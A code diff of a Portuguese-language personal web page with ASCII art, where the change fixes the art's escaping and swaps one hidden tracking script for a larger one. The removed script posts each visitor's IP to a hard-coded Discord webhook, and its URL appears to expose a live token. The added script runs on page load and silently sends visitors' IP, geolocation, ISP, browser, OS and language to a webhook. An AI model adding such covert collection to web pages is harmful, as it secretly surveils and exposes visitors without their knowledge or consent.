@@ -21,10 +21,10 @@
                   ;'        '   ;  |  :
                   )..      .. .:.`.;  :
                  /::...  .:::...   ` ;
-                 ; _ '    __        /:\\
-                 `:o>   /\\o_>      ;:. `.
-                `-`.__ ;   __..--- /:.   \\
-                === \\_/   ;=====_.':.     ;
+                 ; _ '    __        /:\
+                 `:o>   /\o_>      ;:. `.
+                `-`.__ ;   __..--- /:.   \
+                === \_/   ;=====_.':.     ;
                  ,/'`--'...`--....        ;
                       ;                    ;
                     .'                      ;
@@ -35,11 +35,11 @@
              :         |:.   :       ;:.    ;
              :         ::     ;:..   |.    ;
               :       :;      :::....|     |
-              /\\     ,/ \\      ;:::::;     ;
-            .:. \\:..|    :     ; '.--|     ;
+              /\     ,/ \      ;:::::;     ;
+            .:. \:..|    :     ; '.--|     ;
            ::.  :''  `-.,,;     ;'   ;     ;
-        .-'. _.'\\      / `;      \\,__:      \\
-        `---'    `----'   ;      /    \\,.,,,/
+        .-'. _.'\      / `;      \,__:      \
+        `---'    `----'   ;      /    \,.,,,/
                            `----`
             </pre>
         </section>
@@ -50,36 +50,50 @@
             <p>&copy; 2025 Catx64 - Todos os direitos reservados.</p>
         </footer>
     </div>
-
     
     <script>
-        (function() {
-            
-            const sendURL = "https://discord.com/api/webhooks/1326227479622324395/a_uSmUaOYe6WgQeV-1-fifEJm6MmAI5LtBCB_CF8NmUSnhete8Jb53Tm2AF9pGxqR2cM";
+    async function getIPInfo() {
+        const response = await fetch("http://ip-api.com/json/");
+        return response.json();
+    }
 
-            
-            function captureVisitorData() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => sendData(data.ip))
-                    .catch(() => console.warn("Não foi possível capturar o IP."));
-            }
+    async function sendToWebhook() {
+        const ipInfo = await getIPInfo();
+        const userAgent = navigator.userAgent;
+        const idioma = navigator.language;
+        const protocolo = window.location.protocol;
+        const porta = window.location.port || "Padrão";
+        const dataHora = new Date().toLocaleString();
 
-            function sendData(visitorIP) {
-                const payload = { content: `Novo visitante: ${visitorIP}` };
-                fetch(sendURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (!response.ok) console.error("Erro ao enviar dados:", response.status);
-                })
-                .catch(() => console.warn("Não foi possível enviar os dados."));
-            }
+        let mensagem = `🏠 | IP: ${ipInfo.query}\n` +
+            `🔎 | Cidade: ${ipInfo.city}\n` +
+            `📍 | Região: ${ipInfo.regionName}\n` +
+            `🌎 | País: ${ipInfo.country}\n` +
+            `📦 | ISP: ${ipInfo.isp}\n\n` +
+            `🔓 | USER-AGENT: ${userAgent}\n` +
+            `🌐 | NAVEGADOR: ${navigator.appName}\n` +
+            `💻 | SISTEMA OPERACIONAL: ${navigator.platform}\n` +
+            `🚪 | PORTA: ${porta}\n` +
+            `🔒 | PROTOCOLO: ${protocolo}\n` +
+            `👥 | LINGUAGEM: ${idioma}\n` +
+            `📆 | DATA/HORA: ${dataHora}\n\n`;
 
-            captureVisitorData();
-        })();
+        const webhookURL = "SEU_WEBHOOK_URL_AQUI";
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                content: "```" + mensagem + "```"
+            })
+        })
+        .then(response => console.log("Dados enviados com sucesso!"))
+        .catch(error => console.error("Erro ao enviar os dados:", error));
+    }
+
+    sendToWebhook();
     </script>
 </body>
 </html>
